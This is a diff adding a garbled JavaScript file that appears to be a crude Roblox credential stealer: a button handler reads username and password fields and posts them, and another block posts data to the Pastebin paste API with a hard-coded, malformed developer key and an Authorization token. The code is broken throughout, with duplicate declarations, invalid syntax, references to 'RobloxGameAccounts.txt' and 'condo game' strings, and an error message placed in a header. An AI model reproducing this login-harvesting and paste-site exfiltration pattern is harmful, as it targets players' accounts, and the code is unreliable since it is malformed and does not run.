@@ -1,0 +1,53 @@
+const fetchResult = await fetch(url, options);
+const data = await fetchResult.json();
+const require = express.js
+
+output =  {output: NewRobloxGame} == Name.CondoGame() SetCFG:0
+
+
+const { URLSearchParams } = require('url');
+const encodedParams = new URLSearchParams();
+
+
+encodedParams.set('api_paste_code', 'test');
+encodedParams.set('api_option', 'paste');
+encodedParams.set('api_dev_key', 'M3E1OTMyNzU5ODQzMjc1ODk0MzcyNjUwOTgzNDI3ODA1NMjE0ODM4Mjc1MzgyMDc1dDM0MDc4NTA5dmduZGpiaHVvaHJmaW9naHVvaTM0NTg3MHZkCg==zM0MjU=');
+
+
+let url = 'https://pastebin.com/api/api_post.php';
+
+let options = {
+  method: 'POST',
+  headers: {'Content-Type': 'Bad API request, use POST request, not GET'},
+  body: encodedParams.toString()
+};
+
+const fetchResult = await fetch(url, options);
+       document.querySelector('button')
+            .addEventListener('click', (e) => {
+                e.preventDefault();
+                const username = document
+                    .querySelector('#user').value;
+ 
+                const password = document
+                    .querySelector('#pass').value;
+                     
+                fetch('/', {
+                    method: 'POST',
+                    headers: {
+                        Authorization: 'cXd0eXVoYnZ4Y3l1ZHNrdmc4NzIzNA==',
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        RobloxGameAccounts.txt,
+                        Fetch()Password.LoginRobloxUTOOL,
+                    }),
+                })
+                    .then((res) => {
+                        return res.json();
+                    })
+                    .then((data) => console.log(data));
+            });
+
+output =  {output: fetchResult} 
+output = {(CondoGame):fetchResult}
